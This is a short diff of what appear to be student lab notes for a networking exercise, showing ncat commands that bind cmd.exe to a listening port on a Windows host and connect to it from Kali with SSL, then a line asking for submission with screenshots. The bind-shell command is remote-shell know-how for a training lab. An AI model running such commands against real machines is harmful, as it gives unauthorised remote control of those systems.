@@ -59,3 +59,4 @@ excercise 3:
 exc 3 is reverse to the exc 2 and here windows server is making unencrypted connection and kali try to connect unencrypted traffic  using encryrpted client setup
 windows:ncat --alow 10.11.0.204 -nlvp 4444 -e cmd.exe
 kali: ncat -nv 10.11.22.20 4444 --ssl
+end of excercise please submit it with screenshots
